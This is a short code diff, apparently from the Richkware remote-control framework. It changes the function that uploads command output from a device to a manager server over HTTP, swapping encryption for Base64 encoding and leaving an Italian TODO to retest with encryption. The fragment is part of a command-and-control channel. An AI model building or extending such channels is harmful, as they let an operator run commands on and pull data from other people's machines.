@@ -276,7 +276,9 @@ bool Network::uploadCommand(std::string commandsOutput, const std::string &encry
 
     http::Request request("http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command");
 
-    commandsOutput = crypto.Encrypt(commandsOutput);
+    // TODO testare con crittografia
+    //commandsOutput = crypto.Encrypt(commandsOutput);
+    commandsOutput = Base64_urlencode(commandsOutput);
 
     std::string parameters = "{device:\"" + device + "\",data:\"" + commandsOutput + "\"}";
 
